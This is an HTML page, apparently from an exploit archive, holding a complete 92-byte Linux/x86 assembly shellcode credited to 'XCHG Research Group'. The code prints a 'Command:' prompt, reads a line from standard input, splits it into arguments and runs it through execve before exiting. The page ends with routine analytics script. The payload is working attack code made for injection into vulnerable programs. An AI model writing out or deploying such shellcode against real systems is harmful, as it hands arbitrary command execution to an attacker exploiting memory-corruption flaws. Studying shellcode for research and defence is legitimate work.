<html><head><title>Linux/x86 - execve read shellcode - 92 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#    XCHG Research Group
#    Linux/x86 execve read shellcode - 92 bytes
#    
#    
#    )--[ Writed by 0ut0fbound ]--(
#    
#    - http://outofbound.host.sk
#    - http://xchglabs.host.sk

.text

	.globl _start

_start:

# EAX = 0x04 -&gt; syscall write()
	xorl %eax, %eax
	movb $0x4, %al
	xorl %ebx, %ebx
	inc %ebx
	pushl $0x20202020
	pushl $0x3a646e61
	pushl $0x6d6d6f43
	movl %esp, %ecx
	xorl %edx, %edx
	movb $0x9, %dl
	int $0x80 
	
# EAX = 0x03 -&gt; syscall read()
	xorl %eax, %eax
	movb $0x3, %al
	xorl %ebx, %ebx
	xorl %edx, %edx
	movb $0x20, %dl
	subl %edx, %esp
	movl %esp, %ecx
	int $0x80 
	
# buffer[read(0, buffer, sizeof(buffer))] = 0;
	addl %eax, %ecx
	dec %ecx 
	movl %ebx, (%ecx)
	
	movl %esp, %ebx
	addl %eax, %ebx
	movl %eax, %ecx
	
	xorl %edx, %edx
	push %edx 
	
LOOP1: 
	movb (%ebx), %al
	cmp $0x20, %al
	jne CONT 
	xorb $0x20, (%ebx)
	inc %ebx 
	pushl %ebx 
	dec %ebx 
CONT: 
	dec %ebx 
loop LOOP1 
	
	push %ebx 
	
	movl %esp, %ecx
	xorl %eax, %eax
	movb $0xb, %al
	
	int $0x80 
	
# EAX = 0x01 -&gt; syscall exit
	xorl %eax, %eax
	inc %al 
	xorl %ebx, %ebx
	int $0x80 


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
